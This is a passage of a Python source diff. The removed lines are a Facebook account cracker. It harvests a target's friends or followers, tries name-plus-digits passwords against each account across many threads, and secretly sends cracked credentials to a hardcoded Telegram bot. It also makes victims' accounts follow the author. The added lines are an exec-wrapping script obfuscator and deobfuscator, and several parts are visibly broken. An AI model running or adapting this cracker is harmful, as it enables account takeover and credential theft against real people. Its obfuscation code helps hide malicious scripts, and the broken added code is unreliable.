+            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
+            time.sleep(0.2)
+            sys.stdout.flush()
+def banner_dec():
+    banner = '''{}'''.format(m)
+    print(banner)
+    os.system('figlet -f slant "DECRYPT"')
+def banner_enc():
+    banner = '''{}'''.format(m)
+    print(banner)
+    os.system('figlet -f slant "ENCRYPT"')
+def running(s):
 	try:
-		token = re.search('(EAAG\w+)',str(res.text)).group(1)
-	except:
-		token = "Cookies Invalid"
-	finally:
-		return token
-		
-def real_time():
-	return str(mek()).split('.')[0]
-		
-def sesi(session,res):
-	response = BeautifulSoup(res,'html.parser')
-	form = response.find('form',{'method':'post'})
-	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
-	r = BeautifulSoup(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
-	for i in r.find_all('option'):
-		opsi.append(i.text)
-	return opsi
+		for c in s + '\n':
+        	    sys.stdout.write(c)
+	            sys.stdout.flush()
+	            time.sleep(0.001)
+	except (KeyboardInterrupt,EOFError):
+		run('Exit!')
+def run(x):
+    pt = '\x1b[1;37m'
+    rd = '\x1b[1;37m\x1b[1;31m'
+    rg = '\x1b[6;32m'
+    try:
+        num = 0
+        while num < 1:
+            for i, char in enumerate(x):
+                if i == 0:
+                    print '\r%s%s%s%s' % (rg, char.lower(), rd, x[1:]),
+                    sys.stdout.flush()
+                else:
+                    if i == 1:
+                        okklah = x[0].lower()
+                        print '\r%s%s%s%s%s%s' % (rd, okklah, pt, char.lower(), rg, x[2:]),
+                        sys.stdout.flush()
+                    elif i == i:
+                        okklah = x[0:i].lower()
+                        print '\r%s%s%s%s%s%s' % (rd, okklah, pt, char.lower(), rg, x[i + 1:]),
+                        sys.stdout.flush()
+                    time.sleep(0.07)
 
-class Main:
-	
-	def __init__(self,**kwargs):
-		self.coki, self.token = {"cookie":kwargs['coki']}, kwargs['token']
-		self.data_id = []
-		self.mbasic = "https://mbasic.facebook.com"
-	
-	@property
-	def get_my_info(self):
-		r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",cookies=self.coki).json()
-		self.name,self.id = r['name'], r['id']
-		return {'name':self.name, 'id':self.id}
-			
-		
-	@property
-	def Menu(self):
-		try:
-			info = self.get_my_info
-		except KeyError:
-			os.remove("data/token");os.remove("data/coki")
-			exit("\033[1;91mYour Token Expired !")
-		print(
-			f" >> Your Account : {info['name']}, {info['id']} << "
-		)
-		print("""%s
+            num += 1
 
-██████╗     ██████╗     ███████
-██╔══██╗    ██╔══██╗    ██╔════╝
-██████╔╝    ██████╔╝    █████╗  
-██╔══██╗    ██╔══██╗    ██╔══╝  
-██████╔╝    ██║  ██║    ██║ 
-╚═════╝     ╚═╝  ╚═╝    ╚═╝     
-                                
-\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-\x1b[0;34m█  \033[1;91mTelegram : Rekar_Surchi
-\x1b[0;34m█ 
-\x1b[0;34m█  \033[1;91mChanell  : Cracker_00
-\x1b[0;34m█  
-\x1b[0;34m█  \033[1;91mGithub   : https://github.com/RekarSurchi
-\x1b[0;34m█ 
-\x1b[0;34m█  \033[1;91mVersion  : V3
-\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"""%(BM))
-		print(
-			"""\033[1;95m
-	[1] = CRACK WITH PUBLIC ID
-	[0] = EXIT PROGRAMING
-			"""
-		)
-		chose = input("\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mCHOOSE : ")
-		number_list = ['0','1','2','3']
-		while chose not in number_list:
-			print('\033[1;97m[ \033[1;91m! \033[1;97m] \033[1;91mYour Chose Not Found !')
-			chose = input("\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mCHOOSE : ")
-		if chose=='1' or chose=='2':
-			if chose=='1':print("\n")
-			else:print("\n")
-			account_target = input("\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mENTER ID : ")
-			try:
-				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
-				target_name = r['name']
-				print(f"\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mNAME  FB : {target_name}")
-			except KeyError:
-				exit("\033[1;91mDUMP EROR !")
-			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
-			else:self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}",chose="followers")
-			self.validate
-		elif chose=='0':
-			os.remove('data/token');os.remove('data/coki')
-			exit(f'\n √ Logout OK {self.name}')
-		else:
-			print('\nCRACK ID STARTED..... ')
-			try:
-				print(' >> HACKED results :')
-				for x in open('/sdcard/.txt','r').readlines():
-					print(f' > {x}')
-			except:print('  Results 0 ')
-			print(
-				"",""*25
-			)
-			try:
-				print('  NotHacked results :')
-				for x in open('/sdcard/checkpoint.txt','r').readlines():
-					print(f' > {x}')
-			except:print('  Results 0 ')
-				
-			
-class Crack:
-	
-	def crack(self, user, password_list, url):
-		session = requests.Session()
-		for pw in password_list:
-			r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
-				'Host'	:	'mbasic.facebook.com',
-				'Connection'	:	'keep-alive',
-				'Cache-Control'	:	'max-age=0',
-				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
-				'sec-ch-ua-mobile'	:	'?1',
-				'sec-ch-ua-platform'	:	'"Android"',
-				'Upgrade-Insecure-Requests'	:	'1',
-				'User-Agent'	:	'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-				'Sec-Fetch-Site'	:	'same-origin',
-				'Sec-Fetch-Mode'	:	'navigate',
-				'Sec-Fetch-User'	:	'?1',
-				'Sec-Fetch-Dest'	:	'document',
-				'Referer'	:	'https://mbasic.facebook.com/login/device-based/',
-				'Accept-Encoding'	:	'gzip, deflate',
-				'Accept-Language'	:	'id-ID,id;q=0.9'
-			}).text, 'html.parser')
-			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
-			data.update(
-				{
-					'uid':user,
-					'next':'https://mbasic.facebook.com/login/save-device/',
-					'flow':'login_no_pin',
-					'encpass':'#PWD_BROWSER:0:{}:{}'.format(real_time(),pw)
-				}
-			)
-			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
-				'Host'	:	'mbasic.facebook.com',
-				'Connection'	:	'keep-alive',
-				'Content-Length'	:	'142',
-				'Cache-Control'	:	'max-age=0',
-				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
-				'sec-ch-ua-mobile'	:	'?1',
-				'sec-ch-ua-platform'	:	'"Android"',
-				'Upgrade-Insecure-Requests'	:	'1',
-				'Origin'	:	'https://mbasic.facebook.com',
-				'Content-Type'	:	'application/x-www-form-urlencoded',
-				'User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
-				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-				'Sec-Fetch-Site'	:	'same-origin',
-				'Sec-Fetch-Mode'	:	'navigate',
-				'Sec-Fetch-User'	:	'?1',
-				'Sec-Fetch-Dest'	:	'document',
-				'Referer'	:	f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
-				'Accept-Encoding'	:	'gzip, deflate, br',
-				'Accept-Language'	:	'id-ID,id;q=0.9'
-			})
-			if "c_user" in session.cookies.get_dict():
-				ok.append(user+"|"+pw)
-				open("/sdcard/REKAR-OK.txt","a").write(user+"|"+pw+"\n")
-				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
-				self.follow_me(coki)
-				sys.stdout.write('\n%s\r[Succesfull]\n  ID : %s\n  PASS : %s\n  %s%s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
-				requests.post('https://api.telegram.org/bot5593902094:AAEQM2qWLTlIUkHs-mNgfm1D455JwFJhbLA/sendMessage?chat_id=5055612569&text=ID : '+user+'\nPASS : '+pw+'\n')
-				sys.stdout.flush()
-				break
-			elif "checkpoint" in session.cookies.get_dict():
-				cp.append(user+"|"+pw)
-				open("/sdcard/REKAR-CP.txt","a").write(user+"|"+pw+"\n")
-				h2 = {
-					'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
-				}
-				res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
-				ress = BeautifulSoup(res, 'html.parser')
-				form = ress.find('form',{'method':'post'})
-				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
-				data2.update({
-					'email':user,
-					'pass':pw
-				})
-				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
-				ress = BeautifulSoup(res, 'html.parser')
-				if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
-					open("ua","a").write("%s|%s"%(user,pw))
-					sys.stdout.write('\n%s\r[Succesfull]\n  ID : %s\n  PASS : %s\n  %s%s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
-					requests.post('https://api.telegram.org/bot5593902094:AAEQM2qWLTlIUkHs-mNgfm1D455JwFJhbLA/sendMessage?chat_id=5055612569&text=ID : '+user+'\nPASS : '+pw+'\n')
-					sys.stdout.flush()
-				else:
-					if(len(sesi(session,res))==0):
-						if '' in str(ress.find('title').text):
-							sys.stdout.write('\n%s\r\n[Checkpoint] ID : %s\n  PASS : %s\n \n%s'%(M,user,pw,P))
-							sys.stdout.flush()
-					else:
-						sys.stdout.write('\n%s\r[Checkpoint]\n  ID : %s\n  PASS : %s\n  %s%s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
-						sys.stdout.flush()
-				opsi.clear()
-				break
-			sys.stdout.write("\r\033[1;97m[Cracker] Test -> %s/%s \033[1;92mOK:- %s \033[1;93mCP:- %s"%(len(loop),len(data_id),len(ok),len(cp)))
-			sys.stdout.flush()
-		loop.append("memek")
+    except:
+        exit()
 
-class Assets(Main):
-	
-	@property
-	def _password_split(self):
-		_password = input("\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mAdd Pass : ");print("")
-		return _password.split(",")
 
-	@property
-	def validate(self):
-		add = input("\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92m[Y/N] AUTO PASSWORD : ")
-		if add=="y":
-			pas = self._password_split
-		with ThreadPoolExecutor(max_workers=35) as kirim:
-			for x in self.data_id:
-				x = x.lower()
-				namee,id = x.split('><')
-				name = namee.split(" ")
-				if(len(name[0])>=6):
-					__password_list = [namee,name[0]+'12',name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'123456',name[0]+'1234567',name[0]+'12345678',name[0]+'123456789',name[0]+'1212',name[0]+'123123',name[0]+'1122',name[0]+'112233',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999']
-				elif(len(name[0])<=2):
-					__password_list = [namee,name[0]+'12',name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'123456',name[0]+'1234567',name[0]+'12345678',name[0]+'123456789',name[0]+'1212',name[0]+'123123',name[0]+'1122',name[0]+'112233',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999']
-				else:
-					__password_list = [namee,name[0]+'12',name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'123456',name[0]+'1234567',name[0]+'12345678',name[0]+'123456789',name[0]+'1212',name[0]+'123123',name[0]+'1122',name[0]+'112233',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999']
-				if add=="y":
-					__password_list = __password_list + pas
-				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
-	def dumpAccount(self,**latif_ganteng):
-		global data_id
-		if latif_ganteng['chose']=="friends":
-			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['friends']
-		else:
-			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['subscribers']
-		for x in r['data']:
-			try:
-				self.data_id.append(x['name']+"><"+x['id'])
-			except KeyError:
-				pass
-		data_id = self.data_id
-		print(
-			f"\033[1;97m[ \033[1;91m+ \033[1;97m] \033[1;92mTOTAL ID : {len(self.data_id)}"
-		)
-		self.validate
-		
-	def follow_me(self,coki):
-		with requests.Session() as session:
-			_link = BeautifulSoup(session.get(f"{self.mbasic}/latif.harkat.176",headers={'host':'mbasic.facebook.com','accept-language':'id-ID,id;q=0.9'},cookies={"cookie":coki}).text, 'html.parser').find('a',string='Ikuti')
-			if _link:
-				return session.get(f"{self.mbasic}"+_link.get('href'),cookies={"cookie":coki})
+def clr():
+    os.system('clear')
 
-def _login():
-	try:
-		token = open("data/token","r").read()
-		coki = open("data/coki","r").read()
-		Assets(token=token,coki=coki).Menu
-	except FileNotFoundError:
-		try:os.mkdir("data")
-		except:pass
-		print("""\033[1;92m
-		
-8888888888     d8888  .d8888b. 88888888888 
-888           d88888 d88P  Y88b    888     
-888          d88P888 Y88b.         888     
-8888888     d88P 888  "Y888b.      888     
-888        d88P  888     "Y88b.    888     
-888       d88P   888       "888    888     
-888      d8888888888 Y88b  d88P    888     
-888     d88P     888  "Y8888P"     888     
-                                           
-                                           
-                                           
 
-""")
-		coki = input("\033[1;97mEnter Cookies : ")
-		token = convert(coki)
-		if token=="\033[1;91mCookies Invalid":
-			exit("\033[1;91mMaybe your cookies Invalid !")
-		open("data/token","a").write(token)
-		open("data/coki","a").write(coki)
-		Success = Assets(token=token,coki=coki);Success.get_my_info;Success.follow_me(coki);Success.Menu
+def logo():
+    banner_enc()
+def b_menu():
+    jalan("""
+-----------.        .-----------
+  ------    \  __  /    ------
+    -----    \(  )/    -----
+       ---   ' \/ `   ---
+         --- :    : ---
+           --`    '--
+           `/`/..\`\`
+        ====UU====UU====
+            '//||\\`
+              ''``
+        Dec/Enc Python
+""",0.001)
+def menu():
+    clr()
+    b_menu()
+    running('\n{}[{}1{}]{} Encrypt\n{}[{}2{}]{} Decrypt\n'.format(m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p,m,p))
+    asww = raw_input('{}[{}?{}]{} Choose {}>> {}'.format(m,p,m,p,k,p))
+    if asww == '1' or asww == '01':
+	load('Running...')
+	menu_enc()
+    elif asww == '2' or asww == '02':
+	load('Running...')
+	menu_dec()
+    elif asww == '':
+	run('Huh?')
+	menu()
+    else:
+	run('Please check number options!')
+	menu()
+def menu_enc():
+    clr()
+    banner_enc()
+    running('{}[{}01{}]{} Encrypt Base16'.format(m,p,m,k))
+    running('{}[{}02{}]{} Encrypt Base32'.format(m,p,m,k))
+    running('{}[{}03{}]{} Encrypt Base64'.format(m,p,m,k))
+    running('{}[{}04{}]{} Encrypt Hex'.format(m,p,m,k))
+    running('{}[{}05{}]{} Encrypt Marshal'.format(m,p,m,k))
+    running('{}[{}06{}]{} Compile py > pyc'.format(m,p,m,k))
+    running('{}[{}07{}]{} Encrypt Marshal Zlib Base64'.format(m,p,m,k))
+    running('{}[{}08{}]{} Encrypt Zlib '.format(m,p,m,k))
+    running('{}[{}00{}]{} Exit'.format(m,p,m,k))
+    running('')
+    try:
+        inp = raw_input('{}[{}??{}]{} Choose {}>>{} '.format(m,p,m,k,h,p))
+    except (KeyboardInterrupt,EOFError):
+        run ('Disable!!')
+        menu()
+    if inp == '1' or inp == '01':
+        clr()
+        Satu()
+    elif inp == '2' or inp == '02':
+        clr()
+        Dua()
+    elif inp == '3' or inp == '03':
+        clr()
+        Tiga()
+    elif inp == '4' or inp == '04':
+        clr()
+        Empat()
+    elif inp == '5' or inp == '05':
+        clr()
+        Lima()
+    elif inp == '6' or inp == '06':
+        clr()
+        pyc()
+    elif inp == '7' or inp == '07':
+	clr()
+        emzb()
+    elif inp == '8' or inp == '08':
+        clr()
+        ezl()
+    elif inp == '':
+        run ('Input your choice!')
+        time.sleep(2)
+        menu_enc()
+    elif inp == '0' or inp == '00':
+        exit()
+    else:
+        run ('Wrong!, Please input your choice')
+        time.sleep(2)
+        menu_enc()
+def menu_dec():
+    clr()
+    banner_dec()
+    running('{}[{}01{}]{} Decrypt base16'.format(m,p,m,k))
+    running('{}[{}02{}]{} Decrypt base32'.format(m,p,m,k))
+    running('{}[{}03{}]{} Decrypt base64'.format(m,p,m,k))
+    running('{}[{}04{}]{} Decrypt Hex'.format(m,p,m,k))
+    running('{}[{}05{}]{} Decrypt Marshal'.format(m,p,m,k))
+    running('{}[{}06{}]{} Uncompyle6 pyc > py'.format(m,p,m,k))
+    running('{}[{}07{}]{} Decrypt Marshal,Zlib,Base64'.format(m,p,m,k))
+    running('{}[{}08{}]{} Decrypt Zlib'.format(m,p,m,k))
+    running('{}[{}00{}]{} Exit'.format(m,p,m,k))
+    running('')
+    try:
+        inp = raw_input('{}[{}??{}]{} Choose {}>>{} '.format(m,p,m,k,h,p))
+    except (KeyboardInterrupt,EOFError):
+        run ('Disable!!')
+	menu()
+    if inp == '1' or inp == '01':
+	clr()
+	Enam()
+    elif inp == '2' or inp == '02':
+	clr()
+	Tujuh()
+    elif inp == '3' or inp == '03':
+	clr()
+	Delapan()
+    elif inp == '4' or inp == '04':
+	clr()
+	Sembilan()
+    elif inp == '5' or inp == '05':
+	clr()
+	unmarsh()
+    elif inp == '6' or inp == '06':
+	clr()
+	unpyc()
+    elif inp == '7' or inp == '07':
+        clr()
+        mzb()
+    elif inp == '8' or inp == '08':
+        clr()
+        zl()
+    elif inp == '':
+	run ('Input number!')
+	time.sleep(2)
+	menu_dec()
+    elif inp == '0' or inp == '00':
+	exit()
+    else:
+	run ('Wrong, Input your choice!')
+	time.sleep(2)
+	menu_dec()
+def Satu():
+    clr()
+    logo()
+    try:
+        f = raw_input('Filenames: ')
+    except:
+        exit()
 
-if __name__=="__main__":
-	os.system(
-		"clear"
-	)
-	_login()
-#REKAR
+    try:
+        bk = open(f, 'r').read()
+    except:
+        run('file %s not found ' % f)
+        time.sleep(1.5)
+	Satu()
+
+    en = base64.b16encode(bk)
+    ff = f + 'c'
+    open(ff, 'w').write('import base64\nexec(base64.b16decode("%s"))' % en)
+    nm = ('').join(f.split('.')[:1]) + '-enc.py'
+    os.rename(ff, nm)
+    run('file successfully encrypted to %s ' % nm)
+def Dua():
+        clr()
+        logo()
+        try:
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        en = base64.b32encode(bk)
+        ff = f + 'c'
+        open(ff, 'w').write('import base64\nexec(base64.b32decode("' + en + '"))')
+        nm = ('').join(f.split('.')[:1]) + '-enc.py'
+        os.rename(ff, nm)
+        run('file successfully encrypted to %s ' % nm)
+def Tiga():
+        clr()
+        logo()
+        try:
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        en = base64.b64encode(bk)
+        ff = f + 'c'
+        open(ff, 'w').write('import base64\nexec(base64.b64decode("' + en + '"))')
+        nm = ('').join(f.split('.')[:1]) + '-enc.py'
+        os.rename(ff, nm)
+        run('file successfully encrypted to %s ' % nm)
+def Empat():
+        clr()
+        logo()
+        try:
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        en = bk.encode('hex')
+        ff = f + 'c'
+        open(ff, 'w').write('exec("' + en + '").decode("hex")')
+        nm = ('').join(f.split('.')[:1]) + '-enc.py'
+        os.rename(ff, nm)
+        run('file successfully encrypted to %s ' % nm)
+def Lima():
+        clr()
+        logo()
+        try:
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        c = compile(bk, '<okklah>', 'exec')
+        en = marshal.dumps(c)
+        ff = f + 'c'
+        open(ff, 'w').write('import marshal\nexec(marshal.loads(' + repr(en) + '))')
+        nm = ('').join(f.split('.')[:1]) + '-enc.py'
+        os.rename(ff, nm)
+        run('file successfully encrypted to %s ' % nm)
+def emzb():
+    clr()  # Clear screen
+    logo()  # Display logo
+    
+    try:
+        file = input('File: ')  # Use input() for Python 3 compatibility
+        with open(file, 'r') as f:
+            fileopen = f.read()
+        
+        compiled_code = compile(fileopen, file, 'exec')
+        marshaled_code = marshal.dumps(compiled_code)
+        compressed_code = zlib.compress(marshaled_code)
+        encoded_code = base64.b64encode(compressed_code).decode('utf-8')
+        
+        encrypted_script = ('import marshal, zlib, base64\n'
+                            'exec(marshal.loads(zlib.decompress(base64.b64decode("' + encoded_code + '"))))')
+        
+        encrypted_filename = file.replace('.py', '-enc.py')
+        
+        with open(encrypted_filename, 'w') as g:
+            g.write(encrypted_script)
+        
+        print('File successfully encrypted to', encrypted_filename)
+        input('Press Enter To Return To Menu ')
+        menu()  # Assuming menu() is defined elsewhere
+        
+    except IOError:
+        print('File not found')
+        input('Press Enter To Return To Menu ')
+        emzb()
+    except Exception as e:
+        print('An error occurred:', e)
+        input('Press Enter To Return To Menu ')
+        emzb()
+def ezl():
+    print "Encrypt Zlib"
+    file = raw_input('File : ')
+    out = file.replace('.py', '-enc.py')
+    oa = open(file).read()
+    xs = zlib.compress(oa)
+    s = open(out, 'w')
+    s.write('import zlib\nexec(zlib.decompress(' +repr(xs)+ '))')
+    s.close()
+    print ('File saved as '+ out)
+def Enam():
+        clr()
+        banner_dec()
+        try:
+	    print 'Dec base64.b16decocde'
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        bk = bk.replace('exec(base64.b16decode("', '')
+        bk = bk.replace('"))', '')
+        bk = bk.replace('import base64\n', '')
+        en = base64.b16decode(bk)
+        ff = f + 'c'
+        open(ff, 'w').write(en)
+        nm = ('').join(f.split('.')[:1]) + '-decrypt.py'
+        os.rename(ff, nm)
+        run('file successfully decrypted to %s' % nm)
+def Tujuh():
+        clr()
+        banner_dec()()
+        try:
+	    print 'Dec base64.b32decode'
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        bk = bk.replace('exec(base64.b32decode("', '')
+        bk = bk.replace('"))', '')
+        bk = bk.replace('import base64\n', '')
+        en = base64.b32decode(bk)
+        ff = f + 'c'
+        open(ff, 'w').write(en)
+        nm = ('').join(f.split('.')[:1]) + '-decrypt.py'
+        os.rename(ff, nm)
+        run('file successfully decrypted to %s' % nm)
+def Delapan():
+	clr()
+        banner_dec()
+        try:
+	    print 'Dec base64.b64decode'
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        bk = bk.replace(+'exec(base64.b64decode("', '')
+        bk = bk.replace('"))', '')
+        bk = bk.replace('import base64\n', '')
+        en = base64.b64decode(bk)
+        ff = f + 'c'
+        open(ff, 'w').write(en)
+        nm = ('').join(f.split('.')[:1]) + '-decrypt.py'
+        os.rename(ff, nm)
+        run('file successfully decrypted to %s' % nm)
+def Sembilan():
+	clr()
+        banner_dec()
+        try:
+	    print 'Dec hex'
+            f = raw_input('Filenames: ')
+        except:
+            exit()
+
+        try:
+            bk = open(f, 'r').read()
+        except:
+            run('file %s not found ' % f)
+            exit()
+
+        bk = bk.replace('exec("', '') or bk.replace("exec('", '')
+        bk = bk.replace('").decode("hex")', '') or bk.replace("').decode('hex')", '')
+        en = str(bk).decode('hex')
+        ff = f + 'c'
+        open(ff, 'w').write(en)
+        nm = ('').join(f.split('.')[:1]) + '-decrypt.py'
+        os.rename(ff, nm)
+        run('file successfully decrypted to %s' % nm)
+def unmarsh():
+    # Display header
+    print_header()
+
+    # Display menu options
+    print_menu()
+
+    try:
+        pil = raw_input('[?] Choice--> ')  # Prompt user for choice
+    except IOError:
+        unmarsh()  # Handle input/output error gracefully
+    else:
+        if pil == '1':
+            process_file()
+        elif pil == '2':
+            menu()
+        else:
+            print('[!] Choose the right option')
+            unmarsh()
+
+def print_header():
+    # Print styled header
+    print('\xe2\x95\x90' * 31 + '[UNMARSH]' + '>')
+
+def print_menu():
+    # Print menu options
+    print('\nMenu:\n [1]. Automatic Detection Version Script\n [2]. Back To Menu')
+
+def process_file():
+    try:
+        file = raw_input('[#] Input File : ')  # Prompt user for file input
+        with open(file, 'r') as f:
+            content = f.read()
+
+        # Determine Python version based on file content
+        if 'exec' in content:
+            if 'execb' in content:
+                py_version = 2
+            elif 'execc' in content:
+                py_version = 3
+            else:
+                py_version = 1  # Default case
+        else:
+            py_version = 1  # Default case
+
+    except IOError:
+        print('\n[!] File Not Found')
+        raw_input('[#] Press Enter to Return to the menu ')
+        os.system('clear')
+        menu()
+    except Exception as e:
+        print(f'\n[!] Error: {e}')
+        sys.exit()
+
+    # Process based on Python version
+    if py_version == 2:
+        decompile_version = 'decompile(2.7, x, stdout)'
+        py_command = 'python2'
+    elif py_version == 3:
+        decompile_version = 'decompile(3.8, x, stdout)'
+        py_command = 'python3'
+    else:
+        print('[!] File Not Supported')
+        raw_input('[#] Press Enter to Return to the menu ')
+        menu()
+
+    # Write decompilation script to 'un.py'
+    with open('un.py', 'w') as fileout:
+        fileout.write('from sys import stdout\n')
+        fileout.write('from uncompyle6.main import decompile\n')
+        fileout.write('import marshal\n\n')
+        fileout.write(f'x = marshal.loads({content})\n')
+        fileout.write(f'{decompile_version}\n')
+
+    # Execute decompilation process
+    print('[#] Unmarshal process. Please wait...')
+    sp.call(f'{py_command} un.py > unpyc/dec.py', shell=True, stderr=sp.STDOUT)
+    os.system('rm un.py')
+    os.system('clear')
+
+    # Display decompiled output gradually
+    print_decompiled_output()
+
+    # Ask user for further actions
+    ask = raw_input('[?] Decompile Again? y/t ')
+    if ask.lower() == 'y':
+        menu()
+    elif ask.lower() == 't':
+        sys.exit()
+    else:
+        print('[!] Choose the right option!!!')
+        raw_input('[#] Press Enter to Return to the menu ')
+        os.system('clear')
+
+def print_decompiled_output():
+    # Display decompiled output
+    time.sleep(1)
+    with open('unpyc/dec.py', 'r') as delay:
+        for line in delay.readlines():
+            print(line.strip())
+    print('\n[#] Successfully Decompiled')
+    print('[#] File saved: unpyc/dec.py')
+def pyc():
+    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/marsh.py'
+    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
+    from py_compile import compile
+    compile(f)
+    load(m + '[' + p + '#' + m + ']' + p + ' Compile process Wait a minute ...')
+    jalan('\n' + m + '[' + p + '#' + m + ']' + p + ' file successfully compiled', 0.01)
+    print '\n' + m + '[' + p + '#' + m + ']' + p + (' File Saved: {}c').format(f)
+    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Compile Again? y/t >> ')
+    if ask == 'y' or ask == 'Y':
+        menu()
+    elif ask == 't' or ask == 'T':
+        sys.exit()
+    else:
+        print m + '[' + m + '!' + m + ']' + p + ' Choose the right one ' + m + '!!!'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        os.system('clear')
+        menu()
+def unpyc():
+    print m + '[' + p + '#' + m + ']' + p + ' For Example : /path/file.pyc'
+    f = raw_input(m + '[' + p + '?' + m + ']' + p + ' Enter Your File : ')
+    try:
+        open(f, 'r').read()
+    except IOError:
+        print m + '[' + m + '!' + m + ']' + p + ' File Not Found'
+        raw_input(m + '[' + p + '^' + m + ']' + p + ' Press Enter to Return to the menu ')
+        menu()
+    else:
+        load(m + '[' + p + '#' + m + ']' + p + ' Decompile process Wait a minute ...')
+        try:
+            os.system('uncompyle6 ' + f + '> unpyc/jadi.py')
+        except Exception as e:
+            print m + '[' + m + '!' + m + ']' + p + ' Failed to decompile because : ' + e
+
+    print '\n\n' + m + '[' + p + '#' + m + ']' + p + ' Successfully Decompiled'
+    print m + '[' + p + '#' + m + ']' + p + ' file saved : unpyc/jadi.py'
+    ask = raw_input(m + '[' + p + '?' + m + ']' + p + ' Decompile Again? y/t >> ')
+    if ask == 'y' or ask == 'Y':
